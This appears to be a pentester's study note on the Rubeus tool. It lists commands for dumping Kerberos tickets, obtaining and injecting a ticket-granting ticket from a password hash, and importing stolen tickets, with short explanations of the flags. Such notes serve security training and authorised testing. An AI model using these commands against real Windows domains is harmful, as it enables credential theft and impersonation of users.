- Kerberos-focused tool, basically does what Mimikatz does for tickets but more flexibly, and some modules don't need admin rights

```cmd
Rubeus.exe dump /nowrap                                          # dump tickets (admin)
Rubeus.exe asktgt /domain:X /user:Y /rc4:<hash> /ptt              # get + import TGT in one go
Rubeus.exe ptt /ticket:file.kirbi                                 # import an existing ticket
Rubeus.exe createnetonly /program:"cmd.exe" /show                 # throwaway session, keeps our real tickets safe
```
- `/nowrap` = print Base64 on one line instead of wrapped (easier to copy)
- `/ptt` on almost any command = import the resulting ticket immediately instead of just printing it

See: [[Pass The Ticket (Windows)]] · [[Pass The Hash]]